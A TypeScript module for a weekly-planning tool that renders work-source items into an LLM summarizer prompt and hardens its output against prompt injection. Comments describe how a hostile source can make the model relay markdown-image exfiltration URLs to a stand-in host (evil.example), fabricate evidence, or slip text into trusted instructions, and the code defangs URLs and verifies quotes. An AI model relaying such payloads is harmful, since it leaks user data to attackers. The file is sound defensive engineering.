// The Planner (ADR-0005): the plan-my-week task, built on the Summarizer. Pure
// domain. It owns the planning instructions, composes its task prose from the Brief
// contract (kinds + descriptions; ADR-0011), renders the Bundle into the
// summarizer's `data` string (the SOLE Untrusted<T> unwrap site, ADR-0004 §3), and
// attaches the trusted envelope to the summarizer's output. The Brief output schema
// itself lives in brief-contract.ts, the Zod source of truth.

import type { AnnotatedItem, Brief, Bucket, Bundle } from "./domain.ts";
import {
  BRIEF_OUTPUT_SCHEMA,
  BriefOutputSchema,
  KINDS,
  KIND_DESCRIPTIONS,
  SummarizerOutputSchema,
  type BriefEvidence,
  type BriefItem,
  type BriefOutput,
  type ExtractedItem,
  type SummarizerOutput,
} from "./brief-contract.ts";
import { unwrap } from "./trust.ts";
import { summarize } from "./summarize.ts";

// The per-kind bullet list is generated from the contract so the prose and the
// schema enum cannot drift (ADR-0011): the kinds and their meanings are spelled once.
const KIND_BULLETS = KINDS.map((k) => `    * "${k}" — ${KIND_DESCRIPTIONS[k]}`).join("\n");

// An evidence entry is a POINTER plus a snippet: `ref` is the bracketed item number
// from the rendered bundle, `quote` a verbatim span from that item. The model is not
// asked to name its source at all — plan.ts resolves the ref and fills attribution by
// code, so attribution cannot be fabricated (issue #54). An entry whose quote is not
// verbatim in the item it cites is dropped, so a wrong ref costs the entry.
const ITEM_RULES = `- "items": the salient work-items worth attention — curated, not every item.
  Classify each by "kind":
${KIND_BULLETS}
  For each item: a concise "summary" in your own words; optional "when" as human-phrased
  timing ("Thu 9am", "due Fri"); and "evidence" — a list of {ref, quote} where "ref" is
  the bracketed number of the source item the quote comes from (the "[7]" in
  "- [7] [slack/message] …") and "quote" is a short verbatim snippet copied exactly from
  THAT item's rendered text. The ref and the quote must agree: never cite one item's
  number with another item's text. One item may collapse several source items — give each
  quote the ref of the item it was actually copied from.
  When an item's own text does not show who or where, say it in "summary" — a message
  body on its own rarely shows who is waiting on whom.`;

const PLAN_TASK = `You are preparing a "plan my week" rundown from the user's work sources.
Read the data below and produce a curated planning brief:

- "summary": a short prose synthesis of where things stand across all sources. This is
  where cross-source connections surface (e.g. a mail thread and an issue about the same thing).
${ITEM_RULES}`;

// Chosen when the whole window is already in the past (e.g. --window last-week):
// the user is reviewing, not planning, so the synthesis looks back and the items
// that matter are what is still open, owed, or unresolved.
const REVIEW_TASK = `You are preparing a look-back rundown of a past window from the user's work sources.
Read the data below and produce a curated retrospective brief:

- "summary": a short prose synthesis of what happened and where things were left across all
  sources. This is where cross-source connections surface (e.g. a mail thread and an issue
  about the same thing). Write it as a review of the past window, and call out what is
  still open or unresolved.
${ITEM_RULES}
  Extract items even though the window is past — favor what carries forward: actions still
  owed, threads awaiting others, and unresolved questions.`;

const BUCKET_HEADERS: Record<Bucket, string> = {
  standing: "STANDING (open commitments untouched this window)",
  recent: "RECENT (activity within the window)",
  upcoming: "UPCOMING (still ahead)",
};

// ── Length caps on rendered source fields ──
//
// A hostile backend can hand the aggregator an arbitrarily large title/url/extras
// value; unbounded, that inflates the summarizer's context (cost/latency) and widens
// the injection surface handed to the model. Each rendered field is capped at
// `MAX_RENDERED_FIELD_LENGTH` chars, truncated with a visible marker so the
// truncation itself is legible in the rendered bundle (and, transitively, in any
// evidence quote drawn from it — `resolveEvidence`'s substring check runs against the
// per-item rendered text this produces, which is the intended interaction: truncation
// happens at render time, so verification automatically checks the truncated content).
const MAX_RENDERED_FIELD_LENGTH = 2_000;
const TRUNCATION_MARKER = "…[truncated]";

function truncateField(value: string): string {
  if (value.length <= MAX_RENDERED_FIELD_LENGTH) return value;
  return `${value.slice(0, MAX_RENDERED_FIELD_LENGTH)}${TRUNCATION_MARKER}`;
}

/** Render one item, unwrapping its untrusted fields. This is the sole unwrap site. */
function renderItem(item: AnnotatedItem, ref: number): string {
  const span = item.end ? `${item.timestamp} – ${item.end}` : item.timestamp;
  const lines = [
    `- [${ref}] [${item.source}/${item.kind}] ${span}`,
    `  title: ${truncateField(unwrap(item.title))}`,
  ];
  if (item.url) lines.push(`  url: ${truncateField(unwrap(item.url))}`);
  // Attribution is rendered for the model too, not just carried to the Brief: "who and
  // where" is exactly the context that makes a bare message body legible, so the
  // summarizer needs it to classify and phrase items. It stays alongside `extras`
  // rather than replacing keys there — `where: "#flow-mgmt"` is the caption, the
  // `channel.id` in `extras` is the join key the model clusters on (see Attribution).
  if (item.attribution) {
    const { where, who, relationship } = unwrap(item.attribution);
    if (where !== undefined) lines.push(`  where: ${truncateField(where)}`);
    if (who !== undefined) lines.push(`  who: ${truncateField(who.join(", "))}`);
    if (relationship !== undefined) lines.push(`  relationship: ${truncateField(relationship)}`);
  }
  if (item.extras) {
    const extras = unwrap(item.extras);
    for (const [key, value] of Object.entries(extras)) {
      if (value === undefined || value === null) continue;
      const rendered = Array.isArray(value)
        ? value.join(", ")
        : typeof value === "object"
          ? JSON.stringify(value)
          : String(value);
      lines.push(`  ${key}: ${truncateField(rendered)}`);
    }
  }
  return lines.join("\n");
}

/**
 * One rendered item, keyed by the `ref` the model sees. `text` is the exact rendered
 * block handed to the model — keeping it is what lets evidence verification run
 * per-item against the same already-truncated bytes the model read, so the
 * MAX_RENDERED_FIELD_LENGTH interaction needs no separate care.
 */
export interface RenderedItem {
  ref: number;
  item: AnnotatedItem;
  text: string;
}

/** The rendered bundle plus the ref → item index evidence resolution reads. */
export interface RenderedBundle {
  data: string;
  index: Map<number, RenderedItem>;
}

/**
 * Render the whole Bundle into the summarizer's data string, grouped by bucket, and
 * build the ref index alongside it. Refs are sequential across the whole bundle
 * (1-based, assigned in render order), NOT the item's backend `id`: the id is
 * `Untrusted<string>` and backend-controlled, while a ref is generated by rundown, so
 * it is a trusted scalar the model can only echo, never forge into something meaningful.
 */
export function renderBundle(bundle: Bundle): RenderedBundle {
  const buckets: Bucket[] = ["standing", "recent", "upcoming"];
  const sections: string[] = [`Window: ${bundle.window.from} to ${bundle.window.to}`];
  const index = new Map<number, RenderedItem>();
  let ref = 0;
  for (const bucket of buckets) {
    const items = bundle.items.filter((i) => i.bucket === bucket);
    if (items.length === 0) continue;
    const rendered = items.map((item) => {
      ref += 1;
      const text = renderItem(item, ref);
      index.set(ref, { ref, item, text });
      return text;
    });
    sections.push(`\n## ${BUCKET_HEADERS[bucket]}\n${rendered.join("\n")}`);
  }
  return { data: sections.join("\n"), index };
}

export class PlanError extends Error {
  constructor(message: string) {
    super(message);
    this.name = "PlanError";
  }
}

// ── Render-time exfiltration hardening ──
//
// Brief string fields (summary, item summary/when, evidence quote) are
// untrusted-derived (ADR-0004 §1) — the summarizer can be induced to relay hostile
// source bytes into them verbatim, including markdown image/link syntax such as
// `![](https://evil.example/?q=…)`. If a Brief ever lands on a markdown-rendering
// surface, that is zero-click exfiltration: the image tag auto-fetches on render.
// Settled policy is to defang ALL URLs — no allowlist, since a trusted-vs-hostile
// URL distinction can't be drawn from the string alone. This is a deterministic,
// pure post-parse transform (not a model instruction, so it can't be talked out of
// applying), run in `plan()` after `SummarizerOutputSchema.parse` over every output
// string field. The future upgrade path — a trusted structural `url` field copied
// by code alongside the defanged prose — is out of scope here (see ADR-0004 §5).
const MARKDOWN_IMAGE_RE = /!\[([^\]]*)\]\([^)]*\)/g;
const MARKDOWN_LINK_RE = /\[([^\]]*)\]\([^)]*\)/g;
const HTTPS_SCHEME_RE = /https:\/\//gi;
const HTTP_SCHEME_RE = /http:\/\//gi;

/**
 * Defang one string field: strip markdown image/link wrappers down to their visible
 * text (discarding the URL, not just neutralizing it), then neutralize any bare URL
 * scheme that remains — including one that was itself used as markdown link text
 * (e.g. `[https://evil.example](https://evil.example)`). Order matters: images are
 * stripped before links, since `![alt](url)` also matches the link pattern on its
 * `[alt](url)` tail. Honest text with no URLs passes through byte-identical.
 */
function defangText(text: string): string {
  const withoutMarkdown = text.replace(MARKDOWN_IMAGE_RE, "$1").replace(MARKDOWN_LINK_RE, "$1");
  return withoutMarkdown.replace(HTTPS_SCHEME_RE, "hxxps://").replace(HTTP_SCHEME_RE, "hxxp://");
}

/**
 * Apply `defangText` to every string field of the Summarizer's parsed output
 * (summary, each item's summary/when, each evidence quote). Pure transform of an
 * already-unwrapped, already-validated value — not a new `unwrap()` site (ADR-0004
 * §3).
 *
 * Note: this runs AFTER evidence-quote verification (see `verifyEvidence`
 * below), so verification checks quotes against what the summarizer actually saw,
 * and only the surviving, verified quotes get defanged for emission.
 */
function defangOutput(output: BriefOutput): BriefOutput {
  return {
    summary: defangText(output.summary),
    items: output.items.map((item) => ({
      ...item,
      summary: defangText(item.summary),
      ...(item.when !== undefined ? { when: defangText(item.when) } : {}),
      // `where`/`who` are code-copied but still untrusted source bytes — a channel
       // renamed to `![](https://evil.example/?q=leak)` reaches this field verbatim —
      // so they defang exactly like the quote does. Code-copied means unfabricated,
      // not trusted (ADR-0004 §1).
      evidence: item.evidence.map((e) => ({
        ...e,
        ...(e.where !== undefined ? { where: defangText(e.where) } : {}),
        ...(e.who !== undefined ? { who: e.who.map(defangText) } : {}),
        quote: defangText(e.quote),
      })),
    })),
  };
}

// ── Evidence-quote verbatim verification ──
//
// A `evidence.quote` is meant to be a real, attributed snippet (ADR-0005 §4's
// "injection quarantine") — but the summarizer could instead fabricate one that was
// never in any source, laundering it as if it were authoritative evidence. After the
// Zod parse, each quote is checked to be a substring of the rendered bundle string
// (the exact `data` handed to the summarizer). Both sides are normalized first
// (runs of whitespace collapsed to a single space) so an honest, line-wrapped quote
// still matches. Non-matching entries are DROPPED at the entry level; the item
// itself is kept (it may still have other, verified evidence, or none).
//
// Ordering vs. the defang transform above: verification MUST run first, against the
// bundle string as the summarizer actually saw it — defanging first would rewrite
// `https://` to `hxxps://` in the quote and make even an honest quote fail to match
// a bundle that still has the real scheme. So the pipeline in `plan()` is
// parse → verifyEvidence (against the undefanged bundle) → defangOutput (applied to
// the surviving, verified quotes). The final emitted quote is therefore both
// verified-verbatim (as sent) and defanged (as emitted).
function normalizeWhitespace(text: string): string {
  return text.replace(/\s+/g, " ").trim();
}


/**
 * Resolve each evidence entry against the item the model cited, dropping any entry
 * that cannot be placed. Replaces the former global-substring `verifyEvidence`: the
 * haystack is now the cited item's own rendered text, so a verified quote and its
 * attribution are consistent by construction — a quote can only carry an item's
 * attribution if that item genuinely contains the quote. `source` is code-filled from
 * the resolved item, never taken from the model. Items are never dropped, only their
 * unresolvable evidence entries.
 */
function resolveEvidence(items: ExtractedItem[], rendered: RenderedBundle): BriefItem[] {
  return items.map((item) => {
    const evidence: BriefEvidence[] = [];
    for (const e of item.evidence) {
      const quote = normalizeWhitespace(e.quote);
      const cited = rendered.index.get(e.ref);
      if (cited && normalizeWhitespace(cited.text).includes(quote)) {
        // Attribution is copied from the resolved item, not read from the model's
        // output. `unwrap` here is the same sole-unwrap-site allowance renderItem uses
        // (ADR-0004 §3): the value is untrusted source bytes, so it is defanged and
        // cap-checked on the way out like every other Brief string.
        const attribution = cited.item.attribution ? unwrap(cited.item.attribution) : undefined;
        evidence.push({
          source: `${cited.item.source}/${cited.item.kind}`,
          ...(attribution?.where !== undefined ? { where: attribution.where } : {}),
          ...(attribution?.who !== undefined ? { who: attribution.who } : {}),
          quote: e.quote,
        });
        continue;
      }
    }
    return { ...item, evidence };
  });
}

/**
 * Injectable dependencies — the seam that lets Planner tests drive real behavior with
 * a fake Summarizer instead of `mock.module()`, mirroring `SummarizeDeps`. The seam is
 * internal to the compiled binary, so ADR-0004's structural seal is untouched.
 */
export interface PlanDeps {
  /** The Summarizer, overridable for tests. Defaults to the real `summarize`. */
  summarize?: typeof summarize;
}

/**
 * Turn a Bundle into a Brief. Short-circuits an empty bundle (no model call);
 * otherwise renders the bundle, summarizes under the task + trusted guidance, and
 * attaches the trusted envelope. Fail-hard on summarizer failure (propagates).
 *
 * @param guidance Invariant: `guidance` is **user-authored only** — sourced
 *   from `config.json` / CLI flags (ADR-0007's `planning-guidance` seam), never
 *   derived from source content (Bundle items, `extras`, or anything an external
 *   backend can influence). It is concatenated straight into `instructions`, which
 *   becomes the summarizer's TRUSTED system-prompt instruction region (`summarize.ts`
 *   `hardening()` + `Task and guidance (trusted):`) — outside the `<untrusted-data>`
 *   delimiter the Layer-1 hardening keys on. Computing `guidance` from anything a
 *   hostile source could shape (e.g. "top issue title", "most common sender") would
 *   smuggle attacker-controlled bytes into the trusted instruction region and
 *   bypass the delimiter quarantine entirely — a strictly worse breach than a leaked
 *   `evidence.quote`, since instructions there are followed, not just described. Do
 *   not add a call site that builds `guidance` from a Bundle/NormalizedItem/Brief.
 */
export async function plan(
  bundle: Bundle,
  windowIsPast: boolean,
  guidance?: string,
  deps: PlanDeps = {},
): Promise<Brief> {
  const summarizeFn = deps.summarize ?? summarize;
  const envelope = { window: bundle.window, sources: bundle.sources };

  // Empty bundle → empty Brief, no model call (ADR-0005 §8).
  if (bundle.items.length === 0) {
    return { envelope, summary: "", items: [] };
  }

  const task = windowIsPast ? REVIEW_TASK : PLAN_TASK;
  const instructions = guidance
    ? `${task}\n\nAdditional guidance from the user:\n${guidance}`
    : task;

  const rendered = renderBundle(bundle);
  const output = await summarizeFn<SummarizerOutput>({
    instructions,
    data: rendered.data,
    schema: BRIEF_OUTPUT_SCHEMA,
    // Runtime shape-check the model output against the Zod contract (ADR-0011). The
    // API's structured-output config is best-effort; this is the hard guarantee, so
    // well-formed-but-wrong-shape output fails rather than flowing through untyped.
    parse: (value) => SummarizerOutputSchema.parse(value),
  });

  // Evidence resolution then defanging, in that order — see the comments above each function for why.
  const resolvedItems = resolveEvidence(output.items, rendered);
  const defanged = defangOutput({ summary: output.summary, items: resolvedItems });
  // Re-parse post-resolution so the Zod caps stay the enforced source of truth for
  // code-filled fields too (ADR-0011) — `SummarizerOutputSchema.parse` above cannot
  // see them, since code writes them after the model's output is validated.
  const brief = BriefOutputSchema.parse(defanged);
  return { envelope, summary: brief.summary, items: brief.items };
}
